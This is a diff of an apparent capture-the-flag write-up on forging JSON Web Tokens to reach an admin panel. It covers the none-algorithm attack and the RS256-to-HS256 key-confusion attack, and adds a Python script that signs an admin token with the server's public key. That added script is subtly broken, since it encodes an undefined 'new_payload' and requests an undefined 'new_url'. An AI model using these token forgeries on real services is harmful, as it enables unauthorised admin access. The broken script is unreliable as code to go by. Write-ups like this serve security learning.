@@ -6,6 +6,7 @@ categories: [CTF, STF]
 tags: [JWT abuse, tech, cookies, web]
 toc: true
 comments: true
+excerpt: Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?
 ---
 
 *75 SOLVES*
@@ -52,7 +53,7 @@ Decoding the cookies using the [official jwt website](https://jwt.io), we can se
 
 The algorithm used is on RS256 which would explain the excessively long web token.  
 As you can see from the payload, the provided username with its password was able to give us a valid session. However, the role of the user minion is `user` hence the error given showed 
-`only admin allowed` as it was not an admin. ** NICE WE HAVE FOUND A LEAD TO WORK TOWARDS ** 
+`only admin allowed` as it was not an admin. **NICE WE HAVE FOUND A LEAD TO WORK TOWARDS** 
 
 However, since this is algorithm uses an asymmetric encryption, we could not just brute force the symmetric key like most HMAC algorithm JWT token challenges as it uses the private key 
 to sign the JWT. 
@@ -65,19 +66,15 @@ and the `JWT downgrade attack` or also known as `JWT confusion between HMAC and 
 ### Typical JWT 
 
 A typical JWT will look like this
-`
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-`
-JWT are split into 3 parts which are the header, payload and the signature. The header consist of the alg which would be used for the signature. 
+`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
+JWT are split into 3 parts which are the header, payload and the signature. The header consist of the algorithm which would be used for the signature. 
 To decode a JWT token is easy as you just need to base64 decode the value (do note that you have to supply '==' at the back as JWT automatically strips it away).
 
 ### JWT No algorithm Attack
 
 Some libraries treat the `none algorithm` as a valid token with a verified signature. Therefore, anyone would be able to create their own verified JWT with their payload with an empty signature.
 The JWT token would look something like this
-`
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyMzgwM30.
-`
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyMzgwM30.`
 
 ### JWT Downgrade Attack
 
@@ -90,7 +87,7 @@ server would think that it is a valid JWT.
 To read more go [here blog](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) and [here video](https://www.youtube.com/watch?v=wt3UixCiPfo)
 
 
-Please scroll down to the # **Actual Exploit** if you do not want to read my dumb mistakes and skip to the actual exploit :)
+Please scroll down to the **Actual Exploit** if you do not want to read my dumb mistakes and skip to the actual exploit :)
 
 # Exploiting
 
@@ -190,9 +187,9 @@ BOOYYYYYY WAS I DUMB, HOW DID I NOT SEE THIS... hais...and here i was wondering 
 (if you have seen this you would have tried the downgrade attack only instead of the no algorithm attack)
 
 Using back the same script and changing the public key to the new key i was able to get the flag
-`
+```
 $ curl yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem > public.pem
-`
+```
 
 ```py
 import requests 
@@ -229,15 +226,36 @@ print(new_request.text)
 ```
 
 ![upload-image](/assets/img/blog/STF-Unlock-Me/11.png)
-flag : govtech-csg{5!gN_0F_+h3_T!m3S}
+`flag : govtech-csg{5!gN_0F_+h3_T!m3S}`
+
+Something i found out after the i got the flag was that the server did not checked for iat (timestamp). Therefore, the can be further shorted into...
+
+```py
+
+import requests 
+import json
+import jwt, token
+import base64
+
+secret = open('public.pem', 'r').read()
+iat = '1607431189' 
+
+payload = '{ "username": "minion", "role": "admin", "iat": ' + iat + ' }'
+encoded_jwt = str(jwt.encode(json.loads(new_payload), key=secret, algorithm='HS256'))[2:-1]
+url = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock'
+authentication = "Bearer " + encoded_jwt
+headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', "Accept": "*/*", "Host": "yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/", "Authorization": authentication}
+new_request = requests.get(new_url, headers = headers)
+print(new_request.text)
+```
 
 # Thoughts
 
-This challenge was pretty easy but due to me not seeing the source code properly it took me so longgggg to fix my problem.
+This challenge was pretty easy but due to me not seeing the source code properly it took me so longgggg to fix my problem.  
 
 # references
 
-[JWT attack walk through (nccgroup)](https://www.nccgroup.com/sg/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/)
-[critical vulnerabilities in JWT libraries (Auth0)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
-[Abusing JWT (Security Weekly)](https://www.youtube.com/watch?v=wt3UixCiPfo)
-[pyJWT documentation](https://pyjwt.readthedocs.io/en/stable/)
+[JWT attack walk through (nccgroup)](https://www.nccgroup.com/sg/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/)  
+[critical vulnerabilities in JWT libraries (Auth0)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)  
+[Abusing JWT (Security Weekly)](https://www.youtube.com/watch?v=wt3UixCiPfo)  
+[pyJWT documentation](https://pyjwt.readthedocs.io/en/stable/)  
